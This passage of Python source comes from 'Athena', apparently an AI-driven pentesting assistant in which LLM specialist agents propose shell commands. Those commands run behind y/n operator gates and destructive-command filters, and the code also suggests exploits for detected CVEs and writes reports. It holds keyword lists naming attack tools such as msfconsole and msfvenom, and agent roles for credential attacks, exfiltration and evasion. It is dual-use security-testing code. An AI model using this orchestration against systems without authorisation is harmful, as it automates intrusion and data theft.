            self._log(f"[TARGET] {summary} | {notes}")
        else:
            print("\n\033[33m   No target set.\033[0m")

    # ── Command safety gates (carried from v6.1, unchanged) ──────

    def _is_banned(self, cmd: str) -> bool:
        return any(b in cmd.lower() for b in BANNED_COMMANDS)

    def _is_interactive(self, cmd: str) -> Tuple[bool, str]:
        cmd_lower = cmd.lower().strip()
        non_interactive_markers = [
            " -q -r ", " -batch ", " --batch", " -e '", " -c '",
            "sshpass", "<<EOF", "<<<", " -y ", "expect ",
        ]
        if any(m in cmd for m in non_interactive_markers):
            return (False, "")
        for trigger, fix in INTERACTIVE_BLOCKED.items():
            if (cmd_lower.startswith(trigger) or
                f" {trigger}" in cmd_lower or
                f"&& {trigger}" in cmd_lower or
                f"; {trigger}" in cmd_lower):
                # msfconsole with -q -r is fine
                if trigger == "msfconsole" and (" -q -r " in cmd or " -q -x " in cmd):
                    return (False, "")
                return (True, fix)
        return (False, "")

    def _is_destructive(self, cmd: str) -> bool:
        for pattern in DESTRUCTIVE_COMMANDS:
            if re.search(pattern, cmd):
                return True
        return False

    def _needs_double_confirm(self, cmd: str) -> bool:
        for pattern in DOUBLE_CONFIRM:
            if re.search(pattern, cmd):
                return True
        return False

    def _normalize_choice(self, choice: str) -> str:
        c = choice.strip().lower()
        if c in ("y", "yes", "1y", "yy", "yeah", "yep", "ye"):
            return "y"
        if c in ("n", "no", "skip", "nope"):
            return "n"
        if c in ("q", "quit", "exit", "stop"):
            return "q"
        return c

    # ── Command execution (with full y/n gate) ────────────────────

    def run_command(self, cmd: str, label: str = "EXEC") -> str:
        if self._is_destructive(cmd):
            print(f"\n\033[31m   ⛔ DESTRUCTIVE COMMAND REFUSED:\033[0m {cmd}")
            print(f"\033[31m   Athena will not run anything that wipes data, "
                  f"kills the system, or creates fork bombs.\033[0m")
            self._log(f"[DESTRUCTIVE REFUSED] {cmd}")
            return EXEC_DESTRUCTIVE

        is_interactive, fix = self._is_interactive(cmd)
        if is_interactive:
            print(f"\n\033[31m   INTERACTIVE BLOCKED:\033[0m {cmd}")
            print(f"\033[33m   Fix: {fix}\033[0m")
            self._log(f"[INTERACTIVE BLOCKED] {cmd}")
            return EXEC_INTERACTIVE_BLOCKED

        # Visual: command card
        label_color = "31" if label == "VERIFY" else "35"
        label_icon  = "🔬" if label == "VERIFY" else "⚔"
        print(f"\n\033[{label_color}m   {label_icon}  ATHENA SUGGESTS [{label}]:\033[0m")
        print(f"\033[97m   {cmd}\033[0m\n")
        self._log(f"\n[CMD-{label}]\n{cmd}")

        try:
            raw = input(
                "\033[90m   Execute? [y] yes  [n] skip  [q] quit: \033[0m"
            )
        except (EOFError, KeyboardInterrupt):
            print()
            return EXEC_SESSION_EXIT

        choice = self._normalize_choice(raw)
        if choice == "q":
            return EXEC_SESSION_EXIT
        if choice != "y":
            print("\033[90m   Skipped.\033[0m")
            self._log("[SKIPPED]")
            return EXEC_REJECTED

        # Double-confirm for system-modifying commands
        if self._needs_double_confirm(cmd):
            print(f"\n\033[33m   ⚠  This modifies system state. Confirm again.\033[0m")
            try:
                second = input("\033[33m   Really execute? [y/n]: \033[0m")
            except (EOFError, KeyboardInterrupt):
                return EXEC_REJECTED
            if self._normalize_choice(second) != "y":
                print("\033[90m   Cancelled.\033[0m")
                self._log("[DOUBLE CONFIRM CANCELLED]")
                return EXEC_REJECTED

        print(f"\n\033[33m   Executing...  [Ctrl+C to abort this command only]\033[0m\n")
        output_lines = []
        proc = None
        is_exploit = any(kw in cmd.lower() for kw in
                        ["exploit", "msfconsole", "searchsploit -m",
                         "msfvenom", "/tmp/exploit.rc"])

        try:
            proc = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                preexec_fn=os.setsid,
            )
            for line in proc.stdout:
                print(line, end="")
                output_lines.append(line)
            proc.wait()
        except KeyboardInterrupt:
            print("\n\033[33m   Command aborted by user — returning to Athena\033[0m")
            if proc:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    proc.wait(timeout=2)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            output_lines.append("\n[COMMAND ABORTED BY USER]\n")
        except Exception as e:
            err = f"EXECUTION ERROR: {e}"
            print(f"\033[31m{err}\033[0m")
            return err

        raw_output = "".join(output_lines)

        # Auto-CVE lookup on recon-type commands
        if any(kw in cmd for kw in ["nmap", "whatweb", "smbclient",
                                      "nikto", "searchsploit", "nuclei",
                                      "nxc ", "crackmapexec"]):
            cve_extra = auto_cve_lookup(raw_output)
            if cve_extra:
                print(cve_extra)
                # Add to context, but DON'T parse this as findings
                # (those CVEs already came from real output)

        # Auto-exploit suggestion when CVE found
        cve_matches = re.findall(r'CVE-\d{4}-\d+', raw_output, re.IGNORECASE)
        if cve_matches:
            target = (self.target_info.get("ip") or
                      self.target_info.get("domain") or "TARGET")
            for cve in cve_matches[:2]:
                expl = analyze_and_suggest_exploit(cve, target, self.lhost)
                if expl:
                    print(expl)

        self._log(f"[OUTPUT]\n{raw_output}")

        # Source-tagged finding extraction — ONLY on raw subprocess output
        active = self.ptt.find_in_progress()
        active_id = active.nid if active else self.ptt.root_id
        new_count = extract_findings_from_stdout(
            raw_output, source_cmd=cmd, ptt=self.ptt,
            active_node_id=active_id,
        )
        if new_count > 0:
            print(f"\n\033[32m   ↳ {new_count} new finding(s) extracted\033[0m")

        # Compress for AI context
        compressed = compress_output_for_history(
            raw_output, is_exploit_result=is_exploit
        )
        if (len(raw_output) > 1000 and
            len(compressed) < len(raw_output) * 0.5):
            print(f"\033[90m   [output compressed: "
                  f"{len(raw_output)}→{len(compressed)} chars for AI]\033[0m")

        return compressed.strip() or "(no output)"

    # ── Verification command (PoC validation) ────────────────────

    def attempt_verification(self, verify_cmd: str,
                             finding_value: str,
                             finding_type: str) -> bool:
        """Run a verify-tagged command through the y/n gate.
        On success (zero exit AND useful output), promote the finding
        to verified=True in the PTT.

        Per operator instruction: ALWAYS goes through y/n gate.
        """
        print(f"\n\033[31m   ╔═══ POC VERIFICATION ═══╗\033[0m")
        print(f"\033[97m   Claim: {finding_type}={finding_value}\033[0m")
        print(f"\033[33m   Verifier will attempt to confirm this is real.\033[0m")
        print(f"\033[31m   ╚════════════════════════╝\033[0m")

        result = self.run_command(verify_cmd, label="VERIFY")
        if result in (EXEC_REJECTED, EXEC_DESTRUCTIVE,
                      EXEC_INTERACTIVE_BLOCKED, EXEC_SESSION_EXIT):
            return result == EXEC_SESSION_EXIT and False or False

        # Heuristic: verify command output should NOT contain auth-failure
        # markers and SHOULD be non-empty.
        result_lower = result.lower()
        fail_markers = [
            "permission denied", "authentication failed", "access denied",
            "login incorrect", "invalid", "401", "403", "unauthorized",
            "could not connect", "connection refused", "connection timed",
            "not found", "no such", "command not found",
        ]
        if any(m in result_lower for m in fail_markers):
            print(f"\033[31m   ✗ Verification FAILED — "
                  f"{finding_type}={finding_value} stays unverified\033[0m")
            return False

        if not result.strip() or result.strip() == "(no output)":
            print(f"\033[33m   ? Verification inconclusive (empty output)\033[0m")
            return False

        # Promote finding to verified
        for f in self.ptt.findings:
            if f.ftype == finding_type and f.value == finding_value:
                f.verified = True
                f.notes = f"Verified by: {verify_cmd[:120]}"
                print(f"\033[32m   ✓ VERIFIED — "
                      f"{finding_type}={finding_value} confirmed real\033[0m")
                return True

        return False

    # ── Specialist agent dispatch ────────────────────────────────

    def _select_agent(self, node: Optional[PTTNode],
                      free_form: str = "") -> str:
        """Deterministic dispatcher: PTT node phase → specialist role."""
        if node and node.phase in PHASE_TO_AGENT:
            return PHASE_TO_AGENT[node.phase]

        # Fallback: keyword scan over free-form text
        lower = (free_form or "").lower()
        if any(k in lower for k in ["http", "web", "url", "browser", "api"]):
            return "web"
        if any(k in lower for k in ["smb", "kerberos", "domain", "ldap",
                                      "active directory", "ad "]):
            return "ad"
        if any(k in lower for k in ["sudo", "suid", "linux", "/etc",
                                     "linpeas", "kernel"]):
            return "linux_privesc"
        if any(k in lower for k in ["windows", "powershell", "winpeas",
                                     "potato", "service"]):
            return "windows_privesc"
        if any(k in lower for k in ["hash", "crack", "spray", "credential",
                                     "password"]):
            return "credential"
        if any(k in lower for k in ["exfil", "tunnel", "pivot"]):
            return "exfil"
        return "recon"

    # ── Two-pass thinking turn ───────────────────────────────────

    def think_turn(self, prompt: str,
                   workflow_key: Optional[str] = None) -> Dict[str, Any]:
        """Single specialist turn.

        Picks specialist agent based on current PTT node, builds the
        appropriate system prompt, calls the LLM with fallback chain,
        parses the response.

        Returns dict with: agent, thought, cmd, conf, verify, handoff.
        """
        active = self.ptt.find_in_progress() or self.ptt.find_next_pending()
        if active and active.status == "todo":
            self.ptt.set_status(active.nid, "in_progress")
            active = self.ptt.nodes[active.nid]

        agent_role = self._select_agent(active, free_form=prompt)
        self.current_agent = agent_role

        sys_prompt = build_system_prompt(
            agent_role=agent_role,
            target_info=self.target_info,
            ptt=self.ptt,
            active_node=active,
            lhost=self.lhost,
            workflow_key=workflow_key,
            free_form=prompt,
        )

        # Compress history into compact form (just CMDs from prior assistant
        # turns, plus full user turns) — saves tokens.
        windowed = self.history[-MAX_HISTORY_MESSAGES:]
        compressed_history = []
        for msg in windowed:
            if msg["role"] == "assistant":
                cm = re.search(r'\[CMD\](.*?)\[/?CMD\]', msg["content"], re.DOTALL)
                if cm:
                    compressed_history.append({
                        "role": "assistant",
                        "content": f"[CMD]{cm.group(1).strip()}[/CMD]"
                    })
                else:
                    compressed_history.append(msg)
            else:
                compressed_history.append(msg)

        messages = [{"role": "system", "content": sys_prompt}]
        messages.extend(compressed_history)
        messages.append({"role": "user", "content": prompt})

        response = self._think_with_fallback(messages,
                                              max_tokens=MAX_TOKENS_DEFAULT)
        if not response:
            return {"agent": agent_role, "thought": "", "cmd": None,
                    "conf": "red", "verify": None, "handoff": None}

        self.history.append({"role": "user", "content": prompt})
        self.history.append({"role": "assistant", "content": response})
        self._log(f"[AI:{agent_role}]\n{response}")

        parsed = parse_specialist_response(response)
        parsed["agent"] = agent_role

        # Pretty print
        spec = AGENT_SPECS.get(agent_role, AGENT_SPECS["recon"])
        agent_color = spec["color"]
        print(f"\n\033[{agent_color}m   {spec['icon']} {spec['name']}\033[0m  "
              f"\033[90m·\033[0m  {self._current_model_name()}")
        print(hr(64))
        if parsed["thought"]:
            print(f"\033[90m   THOUGHT:\033[0m")
            for line in parsed["thought"].split("\n"):
                print(f"   \033[90m{line.strip()}\033[0m")

        # Confidence indicator
        conf_glyph = {"green": "🟢", "yellow": "🟡", "red": "🔴"}.get(parsed["conf"], "⚪")
        print(f"\n   \033[97mConfidence:\033[0m {conf_glyph} \033[97m{parsed['conf'].upper()}\033[0m")

        if active:
            self.ptt.set_confidence(active.nid, parsed["conf"])

        return parsed

    # ── PTT seeding from workflow ────────────────────────────────

    def _seed_ptt_from_workflow(self, key: str, target: str):
        wf = WORKFLOWS.get(key)
        if not wf:
            return
        goal = f"{wf['name']}: {target}"
        self.ptt = PTT(goal=goal)
        for title, phase in wf["seed"]:
            self.ptt.add_node(self.ptt.root_id, title, phase, status="todo")

    # ── Stuck recovery ───────────────────────────────────────────

    def _handle_stuck(self):
        """When stuck — ask AI for 3 alternative approaches."""
        print("\n\033[33m   ⚠  Athena is stuck.  Asking AI for 3 alternatives...\033[0m")

        active = self.ptt.find_in_progress() or self.ptt.find_next_pending()
        node_desc = (f"Current node: [{active.nid}] {active.title} "
                     f"(phase={active.phase})") if active else "No active node"

        verified_summary = []
        for f in self.ptt.get_verified()[-10:]:
            verified_summary.append(f"{f.ftype}={f.value}")

        prompt = (
            f"You are stuck.  {node_desc}.\n"
            f"Verified findings: {' | '.join(verified_summary) or 'minimal'}.\n"
            "Output ONLY this format:\n"
            "[OPTIONS]\n"
            "1. <approach 1 — fundamentally different angle, one line>\n"
            "2. <approach 2 — different angle, one line>\n"
            "3. <approach 3 — different angle, one line>\n"
            "[/OPTIONS]\n"
            "Each option must take a totally different approach (e.g. enum vs "
            "exploit vs creds vs pivot vs evasion)."
        )

        response = self._think_with_fallback([
            {"role": "system",
             "content": "You are Athena, listing pivot options when stuck."},
            {"role": "user", "content": prompt},
        ])
        if not response:
            print("\033[31m   AI unavailable.  Type your own next objective.\033[0m")
            return

        m = re.search(r'\[OPTIONS\](.*?)\[/?OPTIONS\]', response, re.DOTALL)
        opts_text = m.group(1).strip() if m else response

        print(f"\n\033[35m   ATHENA — 3 ALTERNATIVES:\033[0m\n")
        print(f"\033[97m{opts_text}\033[0m\n")

        try:
            choice = input(
                "\033[90m   Pick [1/2/3] or type own objective: \033[0m"
            ).strip()
        except (EOFError, KeyboardInterrupt):
            return

        if choice in ("1", "2", "3"):
            for line in opts_text.split('\n'):
                if line.strip().startswith(choice + "."):
                    new_obj = line.split('.', 1)[1].strip()
                    print(f"\033[32m   Pursuing: {new_obj}\033[0m")
                    # Mark current as dead-end so we don't loop back
                    if active:
                        self.ptt.set_status(active.nid, "dead_end")
                    self._agent_loop(new_obj)
                    return
        elif choice:
            self._agent_loop(choice)

    # ── Main agent loop ──────────────────────────────────────────

    def _agent_loop(self, initial_prompt: str,
                    workflow_key: Optional[str] = None):
        prompt = initial_prompt
        self.current_workflow_key = workflow_key
        self.stuck_counter = 0

        while True:
            # Status bar
            v_count = len(self.ptt.get_verified())
            tot     = len(self.ptt.findings)
            active  = self.ptt.find_in_progress() or self.ptt.find_next_pending()
            node_label = active.nid if active else "—"
            print()
            print(status_line(self._current_model_name(), self.current_agent,
                              node_label, tot, v_count))

            parsed = self.think_turn(prompt, workflow_key=workflow_key)
            cmd     = parsed["cmd"]
            conf    = parsed["conf"]
            verify  = parsed["verify"]
            handoff = parsed["handoff"]

            if cmd is None:
                print("\n\033[33m   No [CMD] returned.  Try rephrasing.\033[0m")
                break

            # Workflow done check
            if WORKFLOW_DONE in cmd.upper() or "WORKFLOW_COMPLETE" in cmd.upper():
                if active:
                    self.ptt.set_status(active.nid, "done")
                # Check if we have more pending nodes
                nxt = self.ptt.find_next_pending()
                if nxt:
                    print(f"\n\033[32m   ✓ Node done — moving to "
                          f"[{nxt.nid}] {nxt.title}\033[0m")
                    self.ptt.set_status(nxt.nid, "in_progress")
                    prompt = (f"Previous node complete.  "
                              f"Now work on: {nxt.title} (phase: {nxt.phase}). "
                              f"Output [THOUGHT][CMD][CONF].")
                    continue
                else:
                    print("\n\033[32m   ✓ All workflow nodes complete.\033[0m\n")
                    self._log("[WORKFLOW DONE]")
                    break

            # Handoff request
            if handoff and handoff in AGENT_SPECS:
                print(f"\n\033[33m   ↪ Handoff requested: {handoff}\033[0m")
                # Add a sibling node for the handoff phase if reasonable
                if active and active.parent_id:
                    self.ptt.add_node(active.parent_id,
                                      f"Handoff to {handoff}",
                                      handoff, status="todo")

            # Banned check
            if self._is_banned(cmd):
                print("\n\033[31m   Banned upgrade command blocked.\033[0m")
                prompt = ("That apt upgrade variant is blocked.  Use which "
                          "or dpkg -l to check tools.  Provide alternative "
                          "with [THOUGHT][CMD][CONF].")
                continue

            # Track command for repeat detection
            cmd_norm = re.sub(r'\s+', ' ', cmd.strip().lower())
            if cmd_norm in self.command_history[-3:]:
                print(f"\n\033[33m   ⚠  Repeated command — telling AI to pivot\033[0m")
                self.stuck_counter += 1
                if active:
                    self.ptt.increment_attempts(active.nid)
                if self.stuck_counter >= STUCK_THRESHOLD:
                    self.stuck_counter = 0
                    self._handle_stuck()
                    break
                prompt = (f"You already ran '{cmd}' recently.  Take a "
                          f"DIFFERENT approach.  [THOUGHT][CMD][CONF].")
                continue

            self.command_history.append(cmd_norm)
            if len(self.command_history) > 25:
                self.command_history = self.command_history[-25:]

            # Confidence handling
            if conf == "red":
                print(f"\n\033[31m   🔴 Confidence RED — "
                      f"AI says it needs more recon before this command.\033[0m")
                print(f"\033[33m   Skipping execution; asking AI for "
                      f"more info-gathering instead.\033[0m")
                prompt = ("Confidence was RED.  Propose a recon command to "
                          "gather the missing context, not the attack.  "
                          "[THOUGHT][CMD][CONF].")
                continue

            if conf == "yellow":
                print(f"\n\033[33m   🟡 Confidence YELLOW — "
                      f"AI is uncertain.  You may proceed or ask for pivot.\033[0m")

            # Execute the command (always y/n gated)
            if active:
                self.ptt.increment_attempts(active.nid)
                self.ptt.set_last_cmd(active.nid, cmd)
            output = self.run_command(cmd)

            if output == EXEC_SESSION_EXIT:
                print("\n\033[35m   ATHENA:\033[0m Session ended by The Priest.")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                sys.exit(0)

            if output == EXEC_INTERACTIVE_BLOCKED:
                _, fix = self._is_interactive(cmd)
                prompt = (f"That command would hijack the terminal.  {fix}  "
                          f"Provide non-interactive alternative.  "
                          f"[THOUGHT][CMD][CONF].")
                continue

            if output == EXEC_DESTRUCTIVE:
                prompt = ("That command was destructive and refused.  "
                          "Propose a non-destructive alternative.  "
                          "[THOUGHT][CMD][CONF].")
                continue

            if output == EXEC_REJECTED:
                self.stuck_counter += 1
                if active:
                    if active.attempts >= NODE_ATTEMPT_LIMIT:
                        self.ptt.set_status(active.nid, "dead_end")
                        print(f"\033[33m   ✗ Node [{active.nid}] marked dead-end "
                              f"(attempts={active.attempts})\033[0m")
                if self.stuck_counter >= STUCK_THRESHOLD:
                    self.stuck_counter = 0
                    self._handle_stuck()
                    break

                try:
                    raw = input("\n\033[35m   ATHENA:\033[0m Alternative approach? [y/n]: ")
                except (EOFError, KeyboardInterrupt):
                    break
                if self._normalize_choice(raw) == "y":
                    prompt = ("The Priest rejected that.  Different approach "
                              "to same goal.  [THOUGHT][CMD][CONF].")
                    continue
                else:
                    break

            # Successful exec — reset stuck counter
            self.stuck_counter = 0

            # Optional verification
            if verify:
                print(f"\n\033[33m   AI proposed verification command.\033[0m")
                # Try to figure out which finding it's verifying — pick the
                # most recent unverified finding from this node
                if active:
                    candidates = [self.ptt.findings[fid - 1] for fid in active.findings
                                  if fid - 1 < len(self.ptt.findings)]
                else:
                    candidates = []
                target_finding = None
                for f in candidates:
                    if not f.verified:
                        target_finding = f
                        break
                if target_finding is None and self.ptt.get_unverified():
                    target_finding = self.ptt.get_unverified()[-1]

                if target_finding:
                    self.attempt_verification(verify,
                                              target_finding.value,
                                              target_finding.ftype)
                else:
                    # Just run the verify command standalone
                    self.run_command(verify, label="VERIFY")

            # Build pivot prompt with fresh context
            pivot_lines = []
            f_dict = self.ptt.findings_by_type_dict(only_verified=True)
            if f_dict:
                pivot_lines.append("VERIFIED FINDINGS:")
                for k, vs in f_dict.items():
                    pivot_lines.append(f"  {k.upper()}: {', '.join(vs[-4:])}")
            unv = self.ptt.get_unverified()
            if unv:
                u_dict: Dict[str, List[str]] = {}
                for f in unv[-15:]:
                    u_dict.setdefault(f.ftype, []).append(f.value)
                pivot_lines.append("UNVERIFIED CANDIDATES:")
                for k, vs in u_dict.items():
                    pivot_lines.append(f"  {k.upper()}: {', '.join(vs)}")
            pivot = "\n".join(pivot_lines)

            prompt = (
                f"TERMINAL OUTPUT:\n{output}\n\n"
                f"{pivot}\n\n"
                "Analyse with elite reasoning in [THOUGHT].  Pivot on "
                "verified findings.  WORKFLOW_COMPLETE if current node "
                "is done; else next [CMD].  Always include [CONF]."
            )

    # ── Workflow runner ───────────────────────────────────────────

    def _resolve_target(self) -> str:
        target = (self.target_info.get("ip") or
                  self.target_info.get("domain") or "")
        if not target:
            try:
                target = input("\033[90m   Enter target: \033[0m").strip()
            except (EOFError, KeyboardInterrupt):
                target = ""
        return target

    def run_workflow(self, key: str):
        wf = WORKFLOWS.get(key)
        if not wf:
            return
        target = self._resolve_target()
        if not target:
            print("\033[31m   No target.\033[0m")
            return

        print(f"\n\033[35m   ATHENA:\033[0m Workflow: {wf['name']}\n")
        self._log(f"[WORKFLOW] {wf['name']}")
        self._seed_ptt_from_workflow(key, target)
        print(self.ptt.to_terminal())
        print()

        prompt = (f"Workflow: {wf['name']}\nTarget: {target}\n\n"
                  f"Walk the PTT one node at a time.  For each node, output "
                  f"[THOUGHT][CMD][CONF].  Mark WORKFLOW_COMPLETE when the "
                  f"current node is done; the system will move you to the next.")
        self._agent_loop(prompt, workflow_key=key)

    def show_workflow_menu(self):
        print(f"\n{header_box('  WORKFLOW MENU  ', color='35')}\n")
        for k, wf in WORKFLOWS.items():
            print(f"   \033[97m[{k:>2}]\033[0m  {wf['name']}")
            print(f"          \033[90m{wf['description']}\033[0m")
        print(f"\n   \033[97m[ 0]\033[0m  Cancel\n")
        try:
            choice = input("\033[90m   Select: \033[0m").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if choice in WORKFLOWS:
            self.run_workflow(choice)
        elif choice != "0":
            print("\033[33m   Invalid.\033[0m")

    # ── Findings / Tree display ──────────────────────────────────

    def show_findings(self):
        if not self.ptt.findings:
            print("\n\033[90m   No findings yet.\033[0m\n")
            return

        verified = self.ptt.get_verified()
        unverified = self.ptt.get_unverified()

        print(f"\n{header_box('  FINDINGS  ', color='32')}")
        if verified:
            print(f"\n\033[32m   VERIFIED ({len(verified)}):\033[0m")
            for f in verified:
                print(finding_card(f))
        if unverified:
            print(f"\n\033[33m   UNVERIFIED ({len(unverified)}):\033[0m")
            for f in unverified:
                print(finding_card(f))
        print()

    def show_tree(self):
        print(f"\n{header_box('  PENTESTING TASK TREE  ', color='35')}\n")
        print(self.ptt.to_terminal())
        print()
        print(f"  \033[90mLegend:\033[0m  "
              f"○ todo  \033[33m◐\033[0m in_progress  "
              f"\033[32m●\033[0m done  \033[31m✗\033[0m dead-end  "
              f"\033[90m─\033[0m skipped")
        print()

    # ── Report generation (with cleanup pass) ───────────────────

    def _llm_cleanup_pass(self) -> str:
        """Ask the AI to write a clean report from verified findings only.
        This is called at report-generation time.  Returns a markdown body.
        Falls through to a plain dump if the LLM is unavailable.
        """
        verified = self.ptt.get_verified()
        if not verified and not self.ptt.findings:
            return "No findings to report."

        # Prepare context for the LLM
        v_summary = []
        for f in verified:
            v_summary.append(
                f"- {f.ftype}: {f.value} "
                f"(node {f.node_id}, source: `{f.source_cmd[:80]}`)"
            )

        u_summary = []
        for f in self.ptt.get_unverified():
            u_summary.append(f"- {f.ftype}: {f.value} (UNVERIFIED, node {f.node_id})")

        target = (self.target_info.get("ip") or
                  self.target_info.get("domain") or "Unknown")

        sys_prompt = (
            "You are Athena's Reporter agent.  You write professional "
            "penetration test reports.  Be concise, factual.  Use "
            "Markdown headers.  Include CVSS rating where applicable.  "
            "Never invent findings — only use what is provided.  "
            "Drop unverified findings unless they are clearly part of "
            "the attack chain context."
        )

        user_prompt = (
            f"Target: {target}\n"
            f"Mission: {self.target_info.get('notes') or '—'}\n\n"
            f"VERIFIED FINDINGS:\n" + ("\n".join(v_summary) or "(none)") +
            "\n\nUNVERIFIED FINDINGS (mention only if they connect to verified):\n" +
            ("\n".join(u_summary) or "(none)") +
            "\n\nWrite a report with sections:\n"
            "## Executive Summary\n"
            "## Confirmed Findings (with CVSS where applicable)\n"
            "## Attack Chain Analysis\n"
            "## Remediation Recommendations\n"
            "## Appendix: Tooling & Methodology"
        )

        response = self._think_with_fallback([
            {"role": "system", "content": sys_prompt},
            {"role": "user", "content": user_prompt},
        ], max_tokens=2048)

        if not response:
            return self._fallback_report_body()
        return response

    def _fallback_report_body(self) -> str:
        lines = ["## Findings\n"]
        verified = self.ptt.get_verified()
        if verified:
            lines.append("### Verified")
            for f in verified:
                lines.append(f"- **{f.ftype}**: `{f.value}` "
                             f"(source: `{f.source_cmd[:100]}`)")
        unv = self.ptt.get_unverified()
        if unv:
            lines.append("\n### Unverified Candidates")
            for f in unv:
                lines.append(f"- **{f.ftype}**: `{f.value}`")
        return "\n".join(lines)

    def _generate_report(self):
        ts = datetime.datetime.now()
        duration = ts - self.session_start
        rpath = os.path.join(
            LOG_DIR,
            f"report_{self.session_start.strftime('%Y%m%d_%H%M%S')}.md"
        )
        target = " | ".join(filter(None, [
            self.target_info.get("ip", ""),
            self.target_info.get("domain", "")
        ]))

        # Get LLM-generated body
        body = self._llm_cleanup_pass()

        try:
            with open(rpath, "w") as f:
                f.write(f"# ATHENA v{VERSION} REPORT\n\n")
                f.write(f"- **Target:** {target or 'Not set'}\n")
                f.write(f"- **Mission:** {self.target_info.get('notes') or '—'}\n")
                f.write(f"- **Operator:** The Priest\n")
                f.write(f"- **Started:** {self.session_start.isoformat(timespec='seconds')}\n")
                f.write(f"- **Duration:** {str(duration).split('.')[0]}\n")
                f.write(f"- **LHOST:** {self.lhost}\n\n")
                f.write(f"---\n\n")
                f.write(body)
                f.write(f"\n\n---\n\n")
                f.write(f"## Pentesting Task Tree (Final State)\n\n```\n")
                f.write(self.ptt.to_natural_language(max_chars=8000))
                f.write(f"\n```\n\n")
                f.write(f"## Raw Findings (with provenance)\n\n")
                for fnd in self.ptt.findings:
                    mark = "✓" if fnd.verified else "?"
                    f.write(f"- [{mark}] **{fnd.ftype}** = `{fnd.value}` "
                            f"(node {fnd.node_id}, ts {fnd.timestamp})\n")
                    f.write(f"  - source: `{fnd.source_cmd[:200]}`\n")
                f.write(f"\n---\n*Generated by Athena v{VERSION}*\n")
            print(f"\n\033[32m   ✓ Report: {rpath}\033[0m")
        except Exception as e:
            print(f"\033[33m   Report failed: {e}\033[0m")

    def save_session(self):
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(LOG_DIR, f"save_{ts}.txt")
        try:
            with open(path, "w") as f:
                f.write(f"ATHENA SAVE {ts}\n{'='*60}\n\n")
                for msg in self.history:
                    f.write(f"[{msg['role'].upper()}]\n{msg['content']}\n\n")
            print(f"\033[32m   Saved: {path}\033[0m")
        except Exception as e:
            print(f"\033[31m   Save failed: {e}\033[0m")

    # ── Help, status, tool status ─────────────────────────────────

    def show_model_status(self):
        print(f"\n{header_box('  PROVIDER CHAIN  ', color='35')}\n")
        for i, (model_id, name) in enumerate(PROVIDER_CHAIN):
            mark = "\033[32m▶ ACTIVE\033[0m" if i == self.provider_index else "      "
            print(f"   {mark}  [{i+1}]  \033[97m{name:<22}\033[0m  "
                  f"\033[90m{model_id}\033[0m")
        print()

    def show_tools_status(self):
        print(f"\n{header_box('  KALI ARSENAL — AVAILABILITY  ', color='35')}\n")
        all_tools = all_kali_tools_flat()
        # Cache lookups
        for t in all_tools:
            if t not in self.tools_available:
                self.tools_available[t] = cmd_exists(t)

        # Group by category, show install state
        for cat, tools in KALI_TOOLS.items():
            present = [t for t in tools if self.tools_available.get(t)]
            missing = [t for t in tools if not self.tools_available.get(t)]
            print(f"\n   \033[97m{cat.upper()}\033[0m  "
                  f"\033[32m{len(present)}\033[0m / "
                  f"\033[97m{len(tools)}\033[0m available")
            if present:
                print(f"     \033[32m✓\033[0m {', '.join(present[:8])}"
                      + (f" \033[90m+{len(present)-8} more\033[0m" if len(present) > 8 else ""))
            if missing:
                print(f"     \033[31m✗\033[0m {', '.join(missing[:8])}"
                      + (f" \033[90m+{len(missing)-8} more\033[0m" if len(missing) > 8 else ""))
        print()

        all_missing = [t for t, p in self.tools_available.items() if not p]
        if all_missing:
            try:
                ans = input(f"\033[33m   Install {len(all_missing)} missing tools? [y/n]: \033[0m")
            except (EOFError, KeyboardInterrupt):
                return
            if self._normalize_choice(ans) == "y":
                for t in all_missing:
                    install_if_missing(t)
                    self.tools_available[t] = cmd_exists(t)

    def show_help(self):
        print(
            f"\n   \033[35m\033[1mATHENA v{VERSION}\033[0m"
            f"   \033[90mby The Priest\033[0m\n"
            f"   Model      : \033[97m{self._current_model_name()}\033[0m\n"
            f"   LHOST      : \033[97m{self.lhost}\033[0m\n"
            f"   Agents     : \033[97m{len(AGENT_SPECS)}\033[0m  "
            f"(strategist, recon, web, network, ad, linux/win privesc, "
            f"credential, exfil, evasion, reporter)\n"
            f"   Workflows  : \033[97m{len(WORKFLOWS)}\033[0m\n"
            f"   Tools      : \033[97m{len(all_kali_tools_flat())}\033[0m  registered\n\n"
            "   \033[97mworkflow\033[0m  open the workflow menu\n"
            "   \033[97mtarget\033[0m    set or update target\n"
            "   \033[97mfindings\033[0m  show extracted findings (verified + unverified)\n"
            "   \033[97mtree\033[0m      show the Pentesting Task Tree\n"
            "   \033[97mtools\033[0m     show tool availability + auto-install missing\n"
            "   \033[97mmodel\033[0m     show provider chain status\n"
            "   \033[97magent\033[0m     show all agent specialists\n"
            "   \033[97msave\033[0m      save conversation to file\n"
            "   \033[97mreport\033[0m    generate report now\n"
            "   \033[97mclear\033[0m     clear AI memory (PTT preserved)\n"
            "   \033[97mreset\033[0m     reset everything (PTT + findings + history)\n"
            "   \033[97mhelp\033[0m      this menu\n"
            "   \033[97mexit/q\033[0m    end session + report\n\n"
            "   \033[90mOr type any objective in plain English.\033[0m\n"
        )

    def show_agents(self):
        print(f"\n{header_box('  SPECIALIST AGENTS  ', color='35')}\n")
        for role, spec in AGENT_SPECS.items():
            print(f"   \033[{spec['color']}m{spec['icon']}  "
                  f"{spec['name']:<32}\033[0m  \033[90m({role})\033[0m")
        print()

    # ── REPL ──────────────────────────────────────────────────────

    def repl(self):
        print(BANNER)
        self.set_target()
        self.show_help()

        while True:
            try:
                user_input = input("\033[35m[PRIEST]\033[0m > ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n\033[35m   ATHENA:\033[0m Session ended.\n")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                break

            if not user_input:
                continue

            self._log(f"[PRIEST] {user_input}")
            cmd = user_input.lower()

            if cmd in ("exit", "quit", "q"):
                print("\n\033[35m   ATHENA:\033[0m Generating report...\n")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                break
            elif cmd == "help":
                self.show_help()
            elif cmd == "workflow":
                self.show_workflow_menu()
            elif cmd == "target":
                self.set_target()
            elif cmd == "findings":
